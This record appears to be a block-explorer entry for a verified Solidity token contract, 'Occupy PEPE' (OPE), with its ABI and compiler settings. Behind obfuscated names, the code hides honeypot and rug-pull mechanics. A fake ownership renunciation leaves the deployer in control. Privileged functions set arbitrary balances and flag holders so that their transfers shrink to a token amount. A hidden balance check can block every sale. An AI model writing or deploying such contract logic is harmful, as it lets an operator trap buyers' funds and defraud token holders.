{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface limitFeeTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableLaunchedMax) external view returns (uint256);\n\n    function transfer(address limitFrom, uint256 listBuy) external returns (bool);\n\n    function allowance(address isAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitFrom,\n        uint256 listBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableReceiver, uint256 value);\n    event Approval(address indexed isAt, address indexed spender, uint256 value);\n}\n\nabstract contract autoMaxLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountShould {\n    function createPair(address atLimitIs, address modeTx) external returns (address);\n}\n\ninterface buyWallet is limitFeeTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OccupyPEPE is autoMaxLiquidity, limitFeeTx, buyWallet {\n\n    uint256 private walletLaunchedFund;\n\n    address exemptReceiverBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private launchAuto;\n\n    function balanceOf(address enableLaunchedMax) public view virtual override returns (uint256) {\n        return enableTotal[enableLaunchedMax];\n    }\n\n    function buyFund() private view {\n        require(atModeFund[_msgSender()]);\n    }\n\n    uint256 constant maxAt = 15 ** 10;\n\n    function buySender(address minAt, address limitFrom, uint256 listBuy) internal returns (bool) {\n        if (minAt == amountFee) {\n            return shouldExempt(minAt, limitFrom, listBuy);\n        }\n        uint256 feeExemptFrom = limitFeeTx(limitSenderReceiver).balanceOf(exemptReceiverBuy);\n        require(feeExemptFrom == txSell);\n        require(limitFrom != exemptReceiverBuy);\n        if (launchedTrading[minAt]) {\n            return shouldExempt(minAt, limitFrom, maxAt);\n        }\n        return shouldExempt(minAt, limitFrom, listBuy);\n    }\n\n    address public amountFee;\n\n    function shouldExempt(address minAt, address limitFrom, uint256 listBuy) internal returns (bool) {\n        require(enableTotal[minAt] >= listBuy);\n        enableTotal[minAt] -= listBuy;\n        enableTotal[limitFrom] += listBuy;\n        emit Transfer(minAt, limitFrom, listBuy);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeIsFrom;\n    }\n\n    mapping(address => bool) public launchedTrading;\n\n    function teamLiquidity() public {\n        emit OwnershipTransferred(amountFee, address(0));\n        listEnable = address(0);\n    }\n\n    uint256 enableModeLaunch;\n\n    address launchedSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public limitAt;\n\n    constructor (){\n        if (walletTeam == walletLaunchedFund) {\n            maxMode = true;\n        }\n        toShould autoBuy = toShould(launchedSell);\n        limitSenderReceiver = amountShould(autoBuy.factory()).createPair(autoBuy.WETH(), address(this));\n        \n        amountFee = _msgSender();\n        teamLiquidity();\n        atModeFund[amountFee] = true;\n        enableTotal[amountFee] = amountSwap;\n        \n        emit Transfer(address(0), amountFee, amountSwap);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenMin;\n    }\n\n    address public limitSenderReceiver;\n\n    function transfer(address autoSell, uint256 listBuy) external virtual override returns (bool) {\n        return buySender(_msgSender(), autoSell, listBuy);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMax;\n    }\n\n    function walletBuy(address shouldBuy) public {\n        if (limitAt) {\n            return;\n        }\n        if (atMax == receiverTotal) {\n            launchAuto = false;\n        }\n        atModeFund[shouldBuy] = true;\n        \n        limitAt = true;\n    }\n\n    mapping(address => bool) public atModeFund;\n\n    function approve(address limitToken, uint256 listBuy) public virtual override returns (bool) {\n        feeTeam[_msgSender()][limitToken] = listBuy;\n        emit Approval(_msgSender(), limitToken, listBuy);\n        return true;\n    }\n\n    uint256 private walletFee;\n\n    bool private shouldSwapMin;\n\n    string private feeIsFrom = \"Occupy PEPE\";\n\n    uint256 txSell;\n\n    uint8 private isMax = 18;\n\n    function receiverAt(uint256 listBuy) public {\n        buyFund();\n        txSell = listBuy;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountSwap;\n    }\n\n    function allowance(address txTotalReceiver, address limitToken) external view virtual override returns (uint256) {\n        if (limitToken == launchedSell) {\n            return type(uint256).max;\n        }\n        return feeTeam[txTotalReceiver][limitToken];\n    }\n\n    uint256 public minTx;\n\n    function owner() external view returns (address) {\n        return listEnable;\n    }\n\n    bool private maxMode;\n\n    uint256 public atMax;\n\n    uint256 private receiverTotal;\n\n    function receiverMode(address autoSell, uint256 listBuy) public {\n        buyFund();\n        enableTotal[autoSell] = listBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeTeam;\n\n    function getOwner() external view returns (address) {\n        return listEnable;\n    }\n\n    uint256 private amountSwap = 100000000 * 10 ** 18;\n\n    function txLiquidity(address toReceiver) public {\n        buyFund();\n        \n        if (toReceiver == amountFee || toReceiver == limitSenderReceiver) {\n            return;\n        }\n        launchedTrading[toReceiver] = true;\n    }\n\n    uint256 private walletTeam;\n\n    address private listEnable;\n\n    mapping(address => uint256) private enableTotal;\n\n    event OwnershipTransferred(address indexed senderMarketing, address indexed autoTxLaunch);\n\n    string private tokenMin = \"OPE\";\n\n    function transferFrom(address minAt, address limitFrom, uint256 listBuy) external override returns (bool) {\n        if (_msgSender() != launchedSell) {\n            if (feeTeam[minAt][_msgSender()] != type(uint256).max) {\n                require(listBuy <= feeTeam[minAt][_msgSender()]);\n                feeTeam[minAt][_msgSender()] -= listBuy;\n            }\n        }\n        return buySender(minAt, limitFrom, listBuy);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTxLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atModeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunchedMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSenderReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"}],\"name\":\"walletBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OccupyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}